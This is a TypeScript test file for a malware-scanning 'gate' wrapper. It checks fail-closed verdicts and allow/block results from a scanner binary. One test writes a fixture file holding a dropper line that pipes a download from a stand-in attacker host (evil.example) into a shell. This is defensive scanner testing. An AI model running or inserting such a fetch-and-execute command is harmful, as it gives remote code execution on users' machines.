import assert from "node:assert/strict";
import { existsSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
/**
 * gate.test.ts — nemesis gate fail-closed + (when present) real-binary contract.
 *  - missing nemesis binary => gate() returns verdict "error" (BLOCK), never throws.
 *  - real nemesis: gate a clean temp dir => "allow"; gate a malicious file => "block".
 * Skips the real-binary cases gracefully when nemesis is absent.
 */
import { test } from "node:test";

import { resolveEngine } from "../config.js";
import { isEngineError } from "../errors.js";
import { gate, runNemesis } from "./gate.js";

test("FAIL-CLOSED: missing nemesis binary => gate() verdict 'error' (block), no throw", async () => {
  const v = await gate("/tmp/whatever", {}, { nemesisBin: "/nonexistent/nemesis-xyz" });
  assert.equal(v.verdict, "error");
  assert.equal(v.risk_score, 100);
  assert.equal(v.signed, false);
  assert.ok(v.findings.length >= 1);
  assert.equal(v.findings[0]?.rule, "nemesis-unavailable");
});

test("FAIL-CLOSED: empty target => gate() verdict 'error'", async () => {
  const v = await gate("   ");
  assert.equal(v.verdict, "error");
  assert.equal(v.risk_score, 100);
});

test("runNemesis rejects (typed) when the binary is missing", async () => {
  await assert.rejects(
    () => runNemesis(["gate", "/tmp"], {}, { nemesisBin: "/nonexistent/nemesis-xyz" }),
    (e: unknown) => {
      assert.ok(isEngineError(e));
      assert.equal((e as { code: string }).code, "nemesis_unavailable");
      return true;
    },
  );
});

test("CONTRACT: real nemesis gates a clean dir as 'allow'", async (t) => {
  const { nemesisBin } = resolveEngine();
  if (!existsSync(nemesisBin)) {
    t.skip(`nemesis not present at ${nemesisBin}`);
    return;
  }
  const dir = mkdtempSync(join(tmpdir(), "eb-gate-clean-"));
  writeFileSync(join(dir, "safe.py"), "print('hello world')\n");
  const v = await gate(dir, { timeoutMs: 120_000 });
  assert.equal(v.verdict, "allow");
  assert.equal(v.risk_score, 0);
  assert.equal(v.findings.length, 0);
  assert.equal(v.target, dir);
});

test("CONTRACT: real nemesis blocks a known-malicious file", async (t) => {
  const { nemesisBin } = resolveEngine();
  if (!existsSync(nemesisBin)) {
    t.skip(`nemesis not present at ${nemesisBin}`);
    return;
  }
  const dir = mkdtempSync(join(tmpdir(), "eb-gate-bad-"));
  const bad = join(dir, "evil.py");
  writeFileSync(bad, 'import os\nos.system("curl http://evil.example/x | sh")\n');
  const v = await gate(bad, { timeoutMs: 120_000 });
  assert.equal(v.verdict, "block");
  assert.ok(v.risk_score >= 50, "risk should be high for a dropper");
  assert.ok(v.findings.length >= 1, "should surface at least one finding");
  assert.equal(v.findings[0]?.klass, "malware");
});
